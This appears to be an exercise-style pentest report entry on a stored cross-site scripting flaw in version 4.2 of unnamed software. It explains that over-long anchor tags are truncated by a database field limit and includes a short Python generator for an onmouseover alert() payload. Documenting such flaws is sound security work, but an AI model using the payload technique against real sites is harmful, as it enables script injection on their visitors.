## Pentesting Report

1. Unauthenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    - Create an "<a>" tag longer than 64k, which upon truncation renders as malformed HTML. Browsers try to fix this which leads to interpretation of the onmouseover exploit.
    - Sample exploit generator:
    ```python
    out = "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
    for x in range(64*1024):
      out += "A"
    out += "</a>"
    print out
    ```
  - [ ] Affected source code:
    - None, this is an SQL field size limitation that causes this exploit to work due to truncation
